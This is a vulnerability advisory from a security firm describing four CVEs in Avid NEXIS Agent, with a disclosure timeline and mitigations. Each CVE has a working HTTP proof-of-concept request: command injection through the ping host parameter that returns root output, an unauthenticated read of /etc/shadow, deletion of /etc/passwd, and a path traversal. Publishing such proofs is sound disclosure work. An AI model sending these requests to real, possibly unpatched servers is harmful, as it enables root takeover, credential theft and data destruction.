# Table of Contents

# Introduction / Disclaimer

During a customer audit I stumbled over Avid NEXIS® Agent 22.12.0.174 and older versions. The older versions have a default password that can be used to gain access. Luckily, the same default password was also set on the servers with this version. However, as I downloaded and installed the binaries to one of my test machines it showed, that this default password is no longer set/used.
Maybe it was only used in past versions but not changed when the server was upgraded. As to my knowledge, the software uses the Linux or Windows user password for login. Therefore past versions might have created a user that is still used in version 22.12.0.174.
Version 22.12.0.174 seemed to be the latest version of the software at the time of initially finding the vulnerabilities in June 2023. However, in December 2023 the new version 23.12 was released as I was told by our customer. Sadly We weren't able to get our hands on the latest version. We are still convinced that most of the bugs are not resolved, as they seem to be fairly old (one in gSoap was originally identified in 2019) and more due to poor security practices than just a simple mistake.

I tried to contact the vendor since July 2023. In September, after hearing not a single word from the vendor over mail or several twitter accounts, I decided to report the vulnerability to the German Governmental Institution BSI (Bundesamt für Sicherheit in der Informationstechnik) as a mediator that might have so more tools to get contact to the vendor.

In August 2024, the BSI let us know that the vendor responded to them that CVE-2024-26290 (authenticated remote command injection) was remediated in update [2024.6.0](https://kb.avid.com/pkb/articles/troubleshooting/en239659).
Also in August 2024 the  director of Information Security at Avid contacted us, telling us that they want to understand how they could miss this as they want to improve their reporting process. 
However, we have not gotten any updates about the other vulnerabilites as of today.

The vulnerabilites identified can be found quite easily. DriveByte did not take a closer look at the binary to search for further bugs. So if any hunters out there want to take a look: Have fun!

But now let's get into the Advisory.

# Vulnerabilities

## Authenticated Remote Command Injection (Linux): CVE-2024-26290

### Description
The Application is vulnerable to an “Authenticated Remote Command Injection” in the
`GET` parameter `host` for the values in `ping` and `tracert`. But only on Linux systems. Windows does
not show the same behavior. Authenticated attackers are therefore able to execute code on the underlying operating system with `root` permissions

The official description of Avid is:
*"Avid NEXIS Web Agent Input Validation issue can lead to Remote Command Execution (RCE)
The Avid NEXIS Web Agent allows an authenticated user to execute system functions directed to a specific IP address. The Avid NEXIS Web Agent does not validate the inpu IP address and can execute commands without string validation. This allows an authenticated attacker to execute commands on the target machine."* [source: June 20th 2024 Update](https://kb.avid.com/pkb/articles/troubleshooting/en239659).

### Proof of Concept

The vulnerability can be triggered with the following GET request:

```http
GET /agent?r=tools&type=ping&host=127.0.0.1;id HTTP/1.1
Host: 192.168.40.141:5015
Cookie: avidagent=12345; userveragenttoken=3543434935133395140
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/119.0.6045.159 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Accept: */*
Sec-Fetch-Site: same-origin
 Sec-Fetch-Mode: no-cors
 Sec-Fetch-Dest: script
 Referer: https://192.168.40.141:5015/agent
 Accept-Encoding: gzip, deflate, br
 Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
 Priority: u=1
 Connection: close
 ```
 
 The response looks like this (stripped):
 
 ```http
 HTTP/1.1 200 OK
Server: gSOAP/2.8
Content-Type: text/html; charset=utf-8
Content-Length: 3581
Connection: close
<html>
<head>
<title>192.168.40.141 - Avid NEXIS&#174; Agent 22.12.0.174</title>
...
<b class='rtop'><b class='r1'></b><b class='r2'></b><b class='r3'></b><b class='r4'></b></b><div id="content">12 <div style='display:none;' id='glassPane'><span class='aligner'></span><h4 class='align' id='glassPaneMessage'></h4></div><h2 class="table-title">
Ping Results
</h2>
<div class="plain">
<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.040 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.045 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.067 ms
--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2029ms
rtt min/avg/max/mdev = 0.040/0.050/0.067/0.014 ms
uid=0(root) gid=0(root) groups=0(root)context=system_u:system_r:unconfined_service_t:s0
</pre></div>
</div>
...
```

### Mitigation
The official mitigation advisory from Avid for this issue is:
"The NEXIS Web Agent input validation has been resolved in the newest version of NEXIS 2024.6.0. Avid engineering recommends you upgrade to NEXIS 2024.6.0 (available for download on June 18, 2024) to resolve this issue.
If you are unable to update your NEXIS release at this time, you can mitigate the issue by configuring a firewall rule for the Storage Manager Agent (Port 5015) to whitelist access into NEXIS. " [source: June 20th 2024 Update](https://kb.avid.com/pkb/articles/troubleshooting/en239659).

DriveByte recommends both, first, to update to the latest version and second to restrict access to the agent port. This is based on the fact the there is also another possibility to (half officially) execute code on the host with a built-in utility in the agent.

### CVSS
DriveByte Calculated the following CVSS 4.0 base metrics:

8.7 (CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N)

## Unauthenticated Arbitrary File Read (Linux/Windows): CVE-2024-26291

### Description

The Application is vulnerable to an Unauthenticated Arbitrary File Read. This affects the
Agent installed on Linux and Windows alike. The parameter filename does not validate the
path at all. Thus allowing anyone (authentication is not required) to read arbitrary files. As
the application runs per default with the highest privileges (root/NT_AUTHORITY SYSTEM),
attackers are able to obtain critical files like /etc/shadow.

### Proof of Concept 

The vulnerability can be triggered with the following GET request:

```http
GET /logs?filename=%2Fetc%2fshadow HTTP/1.1
Host: 192.168.40.141:5015
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://192.168.40.141:5015/agent?context=5815&r=logs&request=dump_usrv_log
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close
```

The response looks like this (shortened):

```http
HTTP/1.1 200 OK
Server: gSOAP/2.8
Content-Type: application/octet-stream
Content-Length: 1164
Connection: close

root:$1$Or<redacted>njEucgDO1:19775:0:99999:7:::
...
avid-nexis:$5$t3v<redacted>bZgA:19774:0:99999:7:::
```
As we can see, the server responds with the file content of the file we requested. The
function is usually meant to download log files. But it is not restricted in any way.

### Mitigation

As we are not aware of an official fix as of today, we recommend users of Avid Nexis to restrict access to the agent port (default 5015) using an allowlist approach.

### CVSS
DriveByte Calculated the following CVSS 4.0 base metrics:

8.7 (CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N)

## Authenticated Arbitrary File Deletion (Linux/Windows): CVE-2024-26292

### Description
The Application is vulnerable to an authenticated Arbitrary File Deletion. This affects the
Agent installed on Linux and Windows alike. As the application runs per default with the
highest privileges (root/NT_AUTHORITY SYSTEM), attackers are able to delete critical files
like /etc/shadow.

### Proof of Concept

The vulnerability can be triggered with the following GET request (shortened):

```http
GET /agent?filename=%2Fetc%2Fpasswd&r=logs&request=del_usrv_log HTTP/1.1
Host: 192.168.40.141:5015
Cookie: avidagent=12345; userveragenttoken=1294797077750987387
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
...
Referer: https://192.168.40.141:5015/agent?context=5815&r=logs&request=dump_usrv_log
...
```

### Mitigation

Again, as we are not aware of an official fix as of today, we recommend users of Avid Nexis to restrict access to the agent port (default 5015) using an allowlist approach.

### CVSS

DriveByte Calculated the following CVSS 4.0 base metrics:

7.1 (CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N)


## Unauthenticated Path Traversal (Linux/Windows): CVE-2024-26293

### Description
The Application is vulnerable to an Unauthenticated Path Traversal. This affects the agent
installed on Linux and Windows alike. As the application runs per default with the highest
privileges (root/NT_AUTHORITY SYSTEM), attackers are able to obtain critical files like /etc/
shadow etc. This vulnerability in gSOAP 2.8 was already known before. [This link]("https://www.exploit-db.com/exploits/47653") shows that
this vulnerability is already known since at least 2019. However, it seems that the gSOAP
version of the Avid Nexis Agent was not up-to-date.

### Proof of Concept

The vulnerability can be triggered with the following GET request (shortened):

```http
GET /../../../../../../../../../../../../../../../../windows/win.ini%00/common/lib/jquery/jquery-1.11.3.min.js HTTP/1.1
Host: 192.168.40.129:5015
...
```
As we can see the response shows the files contents:

```http
HTTP/1.1 200 OK
Server: gSOAP/2.8
Content-Type: application/x-javascript
Content-Length: 92
Connection: close
Expires: Tue, 16 Jul 2024 11:56:11 GMT

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```
This can also be reproduced on Linux systems.

### Mitigation

Aaaaaand once again, as we are not aware of an official fix as of today, we recommend users of Avid Nexis to restrict access to the agent port (default 5015) using an allowlist approach.

### CVSS
DriveByte Calculated the following CVSS 4.0 base metrics:

8.7 (CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N)

# Acknowlegdements

Special thanks goes to the BSI team for supporting us along the way and trying their best to get the vendor to be involved in the case.

# Timeline
2023/07/14 - Initial contact attempt to the vendor via E-Mail   
2023/07/31 - Contact attempt via twitter to @Avid  
2023/09/24 - Initial vulnerability disclosure of the Authenticated Remote Command Injection vulnerability to BSI   
2023/10/12 - Contact attempt via twitter to @AvidSupport  
2023/11/08 - Message from the BSI that they could not get a reaction of the vendor so far  
2024/01/11 - Message from the BSI that they could not get a reaction of the vendor so far and that they involved CERT/CC / CISA  
2024/02/23 - Message from the BSI that they could not get a reaction of the vendor so far and CISA is also still trying  
2024/02/26 - DriveByte informs the BSI that we have found 3 other vulnerabilities in the software but that it's not the latest version anymore and we would like to get hands on the latest version  
2024/05/15 - BSI rates the responsible disclosure case as "failed" as they could get no contact to the vendor  
2024/05/21 - BSI offers help with getting CVEs for the bugs via ENISA  
2024/07/16 - Official report of the further vulnerabilities  
2024/07/25 - Vendor contacts BSI and mentions closure of the initially reported vulnerability  
2024/07/25 - Answer from BSI that they again try to forward the vulnerabilities to the vendor as there is contact now  
2024/08/05 - BSI Informs us that the vendor will not issue CVEs and that they forward the report to the ENISA  
2024/08/06 - Vendor contacts DriveByte to find out what went wrong with the reporting  
2024/09/10 - ENISA sends CVEs  
2024/08/06 - Vendor contacts DriveByte to find out what went wrong with the reporting   
2024/10/23 - Advisory release
